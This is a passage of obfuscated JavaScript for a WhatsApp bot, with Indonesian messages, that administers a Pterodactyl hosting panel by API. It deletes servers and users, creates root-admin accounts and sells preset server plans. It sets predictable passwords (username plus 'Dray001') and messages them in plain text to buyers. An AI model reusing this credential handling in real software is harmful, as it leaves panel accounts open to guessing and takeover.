            _0x3f20c7("Gunakan perintah " + _0x505e97 + "listsrv " + (_0x3a2324.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "delsrv":
        {
          if (!_0x439cd6 && !_0x3da684) {
            return _0x3f20c7("KHUSUS BANG DRAY TOLOL");
          }
          let _0x5cdc07 = _0x1d31fd[0];
          if (!_0x5cdc07) {
            return _0x3f20c7("ID nya mana?");
          }
          let _0xbb25da = await fetch(domain + "/api/application/servers/" + _0x5cdc07, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x22f1ad = _0xbb25da.ok ? {
            errors: null
          } : await _0xbb25da.json();
          if (_0x22f1ad.errors) {
            return _0x3f20c7("*SERVER NOT FOUND BANG DRAY*");
          }
          _0x3f20c7("*SUCCESSFULLY DELETE THE SERVER BANG DRAY*");
        }
        break;
      case "delusr":
        {
          if (!_0x439cd6) {
            return _0x3f20c7("KHUSUS BANG DRAY TOLOL");
          }
          let _0x36eae8 = _0x1d31fd[0];
          if (!_0x36eae8) {
            return _0x3f20c7("ID nya mana?");
          }
          let _0x18d37c = await fetch(domain + "/api/application/users/" + _0x36eae8, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x3cce6b = _0x18d37c.ok ? {
            errors: null
          } : await _0x18d37c.json();
          if (_0x3cce6b.errors) {
            return _0x3f20c7("*USER NOT FOUND BANG DRAY*");
          }
          _0x3f20c7("*SUCCESSFULLY DELETE THE USER BANG DRAY*");
        }
        break;
      case "webpanel":
        {
          const _0x23593a = "" + domain;
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: _0x23593a,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "addusr":
        {
          if (!_0x439cd6 && !_0x3da684) {
            return _0x3f20c7("KHUSUS BANG DRAY TOLOL");
          }
          let _0x6fe36e = _0x2ece04.split(",");
          if (_0x6fe36e.length < 1) {
            return _0x3f20c7("*Format salah!*\n\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " username,number/tag");
          }
          let _0x59c2cc = _0x6fe36e[1];
          let _0xa468e = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x6fe36e[1] ? _0x6fe36e[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          if (!_0xa468e) {
            return _0x5dd2ef.reply("*Format salah!*\n\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " username,number/tag");
          }
          let _0x2d86aa = (await _0x554af5.onWhatsApp(_0xa468e.split`@`[0]))[0] || {};
          let _0x447d34 = _0x2d86aa.exists ? crypto.randomBytes(5).toString("hex") : _0x6fe36e[3];
          let _0x1cbe54 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x59c2cc + "@dray.offc",
              username: _0x59c2cc,
              first_name: _0x59c2cc,
              last_name: "Memb",
              language: "en",
              password: _0x447d34.toString()
            })
          });
          let _0x4d08d9 = await _0x1cbe54.json();
          if (_0x4d08d9.errors) {
            return _0x3f20c7(JSON.stringify(_0x4d08d9.errors[0], null, 2));
          }
          let _0x14a38f = _0x4d08d9.attributes;
          let _0x106f07 = await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            text: "\n*SUCCESSFULLY ADD USER*\n\n  INFO USER\n*⥁**ID* : " + _0x14a38f.id + "\n*⥁**USERNAME* : " + _0x14a38f.username + "\n*⥁**EMAIL* : " + _0x14a38f.email + "\n*⥁**NAME* : " + _0x14a38f.first_name + " " + _0x14a38f.last_name + "\n*⥁**CREATED AT* :  " + tanggal + "\n*⥁**PASSWORD BERHASIL DI KIRIM KE @" + _0xa468e.split`@`[0] + "*",
            mentions: [_0xa468e]
          });
          _0x554af5.sendMessage(_0xa468e, {
            text: "*BERIKUT DETAIL AKUN PANEL ANDA*\n\n  INFO USER\n*⥁**USERNAME* : " + _0x59c2cc + "\n*⥁**PASSWORD* : " + _0x447d34.toString() + "\n*⥁**LOGIN* : " + domain + "\n*⥁**INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*⥁**TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n"
          });
        }
        break;
      case "cadmin":
        {
          if (!_0x439cd6 && !_0x3da684) {
            return _0x3f20c7("*KHUSUS BANG DRAY TOLOL*");
          }
          if (!_0x439cd6) {
            return _0x3f20c7(mess.owner);
          }
          let _0x341e9e = q.split(",");
          let _0x2cb9f7 = _0x341e9e[0];
          let _0x432924 = _0x341e9e[0];
          let _0x5a9d35 = _0x341e9e[1];
          if (_0x341e9e.length < 2) {
            return _0x3f20c7("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          if (!_0x432924) {
            return _0x3f20c7("Ex : " + (_0x505e97 + _0x3c8344) + " Username,@tag/nomor\n\nContoh :\n" + (_0x505e97 + _0x3c8344) + " example,@user");
          }
          if (!_0x5a9d35) {
            return _0x3f20c7("Ex : " + (_0x505e97 + _0x3c8344) + " Username,@tag/nomor\n\nContoh :\n" + (_0x505e97 + _0x3c8344) + " example,@user");
          }
          let _0x3f17e4 = _0x432924 + "Dray001";
          let _0x12b56e = _0x5a9d35.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x506d20 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x432924 + "@dray.offc",
              username: _0x432924,
              first_name: _0x432924,
              last_name: "Memb",
              language: "en",
              root_admin: true,
              password: _0x3f17e4.toString()
            })
          });
          let _0x1f6e8b = await _0x506d20.json();
          if (_0x1f6e8b.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x1f6e8b.errors[0], null, 2));
          }
          let _0x66220a = _0x1f6e8b.attributes;
          let _0x449e12 = "\nTYPE: user\n\n*🗃️*ID: " + _0x66220a.id + "\n*✅*USERNAME: " + _0x66220a.username + "\n*📩*EMAIL: " + _0x66220a.email + "\n*📌*NAME: " + _0x66220a.first_name + " " + _0x66220a.last_name + "\n*🌍*LANGUAGE: " + _0x66220a.language + "\n*💻*ADMIN: " + _0x66220a.root_admin + "\n*🚬*CREATED AT: " + _0x66220a.created_at + "\n";
          const _0x4de52d = {
            text: _0x449e12
          };
          await _0x554af5.sendMessage(_0x5dd2ef.chat, _0x4de52d);
          await _0x554af5.sendMessage(_0x12b56e, {
            text: "*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n\n\n*🗃️USERNAME* : " + _0x66220a.username + "\n*🔒PASSWORD* : " + _0x3f17e4 + "\n*🚬LOGIN* : " + domain + "\n\n*📦INFO PANEL* : https://chat.whatsapp.com/FKgszhQiJsE1h21GIDylOU\n*🔑TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*\n\n\n"
          });
        }
        break;
      case "listadmin":
        {
          if (!_0x439cd6 && !_0x3da684) {
            return _0x3f20c7("Maaf, Anda tidak dapat melihat daftar pengguna.");
          }
          let _0xefe5cf = _0x1d31fd[0] ? _0x1d31fd[0] : "1";
          let _0x706ac8 = await fetch(domain + "/api/application/users?page=" + _0xefe5cf, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x40ee50 = await _0x706ac8.json();
          let _0x16d816 = _0x40ee50.data;
          let _0xd8b5cb = "Berikut list admin BY dray:\n\n";
          for (let _0x4e1fc8 of _0x16d816) {
            let _0x266dee = _0x4e1fc8.attributes;
            if (_0x266dee.root_admin) {
              _0xd8b5cb += "ID: " + _0x266dee.id + " - Status: " + (_0x266dee.attributes?.user?.server_limit === null ? "Inactive" : "Active") + "\n";
              _0xd8b5cb += _0x266dee.username + "\n";
              _0xd8b5cb += _0x266dee.first_name + " " + _0x266dee.last_name + "\n\n";
              _0xd8b5cb += "BY dray";
            }
          }
          _0xd8b5cb += "Page: " + _0x40ee50.meta.pagination.current_page + "/" + _0x40ee50.meta.pagination.total_pages + "\n";
          _0xd8b5cb += "Total Admin: " + _0x40ee50.meta.pagination.count;
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            text: _0xd8b5cb
          }, {
            quoted: _0x5dd2ef
          });
          if (_0x40ee50.meta.pagination.current_page < _0x40ee50.meta.pagination.total_pages) {
            _0x5dd2ef.reply("Gunakan perintah " + _0x505e97 + "listusr " + (_0x40ee50.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "1gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x3acf0a = _0x2ece04.split(",");
          if (_0x3acf0a.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x387850 = _0x3acf0a[0];
          let _0x5d1e84 = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x3acf0a[1] ? _0x3acf0a[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x22c0d5 = _0x387850 + "1gb";
          let _0x465351 = global.eggsnya;
          let _0x393dbf = global.location;
          let _0x1ba166 = "1024";
          let _0x1725af = "30";
          let _0x189665 = "1024";
          let _0x5a022a = _0x387850 + "1398@dray.com";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x5d1e84) {
            return;
          }
          let _0x5c24bb = (await _0x554af5.onWhatsApp(_0x5d1e84.split`@`[0]))[0] || {};
          let _0x591236 = _0x387850 + "Dray001";
          let _0x968c42 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x5a022a,
              username: _0x387850,
              first_name: _0x387850,
              last_name: _0x387850,
              language: "en",
              password: _0x591236
            })
          });
          let _0x90afc0 = await _0x968c42.json();
          if (_0x90afc0.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x90afc0.errors[0], null, 2));
          }
          let _0x15af5f = _0x90afc0.attributes;
          let _0x19a6d1 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x465351, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x15af5f.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x5d1e84.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x15af5f.username + "\n*➣ PASSWORD* : " + _0x591236 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel";
          _0x554af5.sendMessage(_0x5d1e84, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x52828f = await _0x19a6d1.json();
          let _0x5c6a05 = _0x52828f.attributes.startup;
          let _0x1d5efc = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x22c0d5,
              description: " ",
              user: _0x15af5f.id,
              egg: parseInt(_0x465351),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x5c6a05,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x1ba166,
                swap: 0,
                disk: _0x189665,
                io: 500,
                cpu: _0x1725af
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x393dbf)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x5d0b0f = await _0x1d5efc.json();
          if (_0x5d0b0f.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x5d0b0f.errors[0], null, 2));
          }
          let _0x161cd4 = _0x5d0b0f.attributes;
          let _0x367a19 = await _0x5dd2ef.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x15af5f.id + "\n📌NAME: " + _0x15af5f.first_name + " " + _0x15af5f.last_name + "\n💵MEMORY: " + (_0x161cd4.limits.memory === 0 ? "Unlimited" : _0x161cd4.limits.memory) + " MB\n📦DISK: " + (_0x161cd4.limits.disk === 0 ? "Unlimited" : _0x161cd4.limits.disk) + " MB\n⌛CPU: " + _0x161cd4.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "2gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x54ecb1 = _0x2ece04.split(",");
          if (_0x54ecb1.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x2bd9c8 = _0x54ecb1[0];
          let _0x2f796f = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x54ecb1[1] ? _0x54ecb1[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x500559 = _0x2bd9c8 + "2gb";
          let _0xaaaf8c = global.eggsnya;
          let _0xb4de18 = global.location;
          let _0x2c57b1 = "2048";
          let _0x1966bf = "50";
          let _0x146ca9 = "2048";
          let _0x23d0f7 = _0x2bd9c8 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x2f796f) {
            return;
          }
          let _0x24941b = (await _0x554af5.onWhatsApp(_0x2f796f.split`@`[0]))[0] || {};
          let _0x4d0d25 = _0x2bd9c8 + "Dray001";
          let _0x421306 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x23d0f7,
              username: _0x2bd9c8,
              first_name: _0x2bd9c8,
              last_name: _0x2bd9c8,
              language: "en",
              password: _0x4d0d25
            })
          });
          let _0x26846a = await _0x421306.json();
          if (_0x26846a.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x26846a.errors[0], null, 2));
          }
          let _0x1c1c6f = _0x26846a.attributes;
          let _0x5b1678 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xaaaf8c, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x1c1c6f.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x2f796f.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x1c1c6f.username + "\n*➣ PASSWORD* : " + _0x4d0d25 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x2f796f, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x51a54b = await _0x5b1678.json();
          let _0x4bf31c = _0x51a54b.attributes.startup;
          let _0x151175 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x500559,
              description: " ",
              user: _0x1c1c6f.id,
              egg: parseInt(_0xaaaf8c),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x4bf31c,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x2c57b1,
                swap: 0,
                disk: _0x146ca9,
                io: 500,
                cpu: _0x1966bf
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0xb4de18)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x3ea342 = await _0x151175.json();
          if (_0x3ea342.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x3ea342.errors[0], null, 2));
          }
          let _0x371b6a = _0x3ea342.attributes;
          let _0x35ecab = await _0x5dd2ef.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x1c1c6f.id + "\n📌NAME: " + _0x1c1c6f.first_name + " " + _0x1c1c6f.last_name + "\n💵MEMORY: " + (_0x371b6a.limits.memory === 0 ? "Unlimited" : _0x371b6a.limits.memory) + " MB\n📦DISK: " + (_0x371b6a.limits.disk === 0 ? "Unlimited" : _0x371b6a.limits.disk) + " MB\n⌛CPU: " + _0x371b6a.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "3gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x13e0d9 = _0x2ece04.split(",");
          if (_0x13e0d9.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x5e5033 = _0x13e0d9[0];
          let _0x4d085d = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x13e0d9[1] ? _0x13e0d9[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x3e5fd4 = _0x5e5033 + "3gb";
          let _0x211fd8 = global.eggsnya;
          let _0x759ec0 = global.location;
          let _0x2e2dee = "3072";
          let _0x35b338 = "70";
          let _0x303347 = "3072";
          let _0x4e6d2f = _0x5e5033 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x4d085d) {
            return;
          }
          let _0x43831d = (await _0x554af5.onWhatsApp(_0x4d085d.split`@`[0]))[0] || {};
          let _0x17ba13 = _0x5e5033 + "Dray001";
          let _0x356a16 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x4e6d2f,
              username: _0x5e5033,
              first_name: _0x5e5033,
              last_name: _0x5e5033,
              language: "en",
              password: _0x17ba13
            })
          });
          let _0x20a9f8 = await _0x356a16.json();
          if (_0x20a9f8.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x20a9f8.errors[0], null, 2));
          }
          let _0x4762ed = _0x20a9f8.attributes;
          let _0x509880 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x211fd8, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x4762ed.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x4d085d.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x4762ed.username + "\n*➣ PASSWORD* : " + _0x17ba13 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x4d085d, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x157d9c = await _0x509880.json();
          let _0x3c5062 = _0x157d9c.attributes.startup;
          let _0x178152 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x3e5fd4,
              description: " ",
              user: _0x4762ed.id,
              egg: parseInt(_0x211fd8),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x3c5062,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x2e2dee,
                swap: 0,
                disk: _0x303347,
                io: 500,
                cpu: _0x35b338
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x759ec0)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x28d436 = await _0x178152.json();
          if (_0x28d436.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x28d436.errors[0], null, 2));
          }
          let _0x6b1f6d = _0x28d436.attributes;
          let _0x4e9f10 = await _0x5dd2ef.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x4762ed.id + "\n📌NAME: " + _0x4762ed.first_name + " " + _0x4762ed.last_name + "\n💵MEMORY: " + (_0x6b1f6d.limits.memory === 0 ? "Unlimited" : _0x6b1f6d.limits.memory) + " MB\n📦DISK: " + (_0x6b1f6d.limits.disk === 0 ? "Unlimited" : _0x6b1f6d.limits.disk) + " MB\n⌛CPU: " + _0x6b1f6d.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "4gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x56b5bd = _0x2ece04.split(",");
          if (_0x56b5bd.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x17a696 = _0x56b5bd[0];
          let _0x7a72f0 = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x56b5bd[1] ? _0x56b5bd[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x1a7d2f = _0x17a696 + "4gb";
          let _0x208be4 = global.eggsnya;
          let _0x238358 = global.location;
          let _0xec0965 = "4048";
          let _0x292d4d = "90";
          let _0x180cc2 = "4048";
          let _0x3b79af = _0x17a696 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x7a72f0) {
            return;
          }
          let _0x3df2f9 = (await _0x554af5.onWhatsApp(_0x7a72f0.split`@`[0]))[0] || {};
          let _0x17da1d = _0x17a696 + "Dray001";
          let _0x3dceaf = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x3b79af,
              username: _0x17a696,
              first_name: _0x17a696,
              last_name: _0x17a696,
              language: "en",
              password: _0x17da1d
            })
          });
          let _0x19c34c = await _0x3dceaf.json();
          if (_0x19c34c.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x19c34c.errors[0], null, 2));
          }
          let _0x2a06f2 = _0x19c34c.attributes;
          let _0x44e0ac = await fetch(domain + "/api/application/nests/5/eggs/" + _0x208be4, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x2a06f2.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x7a72f0.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x2a06f2.username + "\n*➣ PASSWORD* : " + _0x17da1d + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x7a72f0, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x4e77f4 = await _0x44e0ac.json();
          let _0x5bb057 = _0x4e77f4.attributes.startup;
          let _0x4d645c = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x1a7d2f,
              description: " ",
              user: _0x2a06f2.id,
              egg: parseInt(_0x208be4),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x5bb057,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0xec0965,
                swap: 0,
                disk: _0x180cc2,
                io: 500,
                cpu: _0x292d4d
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x238358)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x282309 = await _0x4d645c.json();
          if (_0x282309.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x282309.errors[0], null, 2));
          }
          let _0xd4c456 = _0x282309.attributes;
